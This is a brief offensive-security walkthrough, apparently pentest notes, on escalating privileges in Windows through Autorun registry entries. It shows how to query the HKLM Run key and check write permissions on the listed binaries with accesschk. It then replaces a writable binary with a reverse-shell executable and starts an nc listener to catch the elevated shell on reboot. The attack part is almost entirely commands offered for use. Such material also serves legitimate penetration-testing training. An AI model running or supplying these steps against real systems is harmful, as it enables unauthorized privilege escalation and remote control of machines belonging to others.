- - -
Windows can be configured to automatically run commands at startup, with elevated privileges.
These Autorun files are configured in the registry.
Is our user is able to write that Autorun executable File and are able to restart the system(Or just wait for it to be restarted )
Then we may be able to elevate privileges.

## Start :

###### Query the registry for Autorun programs.

```
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

```
results : 1
          2 
          3
```

Do we have **write permissions** in the existing binary path. Note at your **GROUP** in the results. Find the writable one!!

```
.\accesschk.exe /accepteula -wvu “C:\Program Files\Some more Path\Vulnerable_executable1”


.\accesschk.exe /accepteula -wvu “C:\Program Files\Some more Path\Vulnerable_executable2”


.\accesschk.exe /accepteula -wvu “C:\Program Files\Some more Path\Vulnerable_executable3”                 # and so on.
```

**have a backup.**

```
copy “C:\Program Files\Some more Path\Vulnerable_executable3” C:\Temp
```

Replace the executable with the reverse shell.

```
copy /Y C:\Temp\reverse.exe “C:\Program Files\Some more Path\Vulnerable_executable3”
```

```sh
nc -nvlp 9090
```

Now go and restart the windows or if you have no rights to do so , just wait.

As the system starts you will get a reverse connnection.

- - - 
